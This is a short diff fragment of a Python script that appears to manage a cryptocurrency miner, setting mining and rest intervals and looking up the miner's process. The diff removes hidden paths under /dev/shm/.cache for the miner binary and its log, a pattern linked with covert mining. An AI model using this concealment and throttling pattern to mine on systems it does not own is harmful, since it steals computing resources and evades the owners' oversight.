@@ -4,10 +4,10 @@ import psutil
 import sys
 
 # CONFIG
-MINER_NAME = "/dev/shm/.cache/tobrut"  
+MINER_NAME = "tobrut"  
 MINING_TIME = 1200  # 20 menit
 REST_TIME = 600  # 10 menit
-LOG_PATH = "/dev/shm/.cache/logs/sayangku.log"
+LOG_PATH = "sayangku.log"
 
 def get_pid(name):
     for proc in psutil.process_iter(['pid', 'name']):
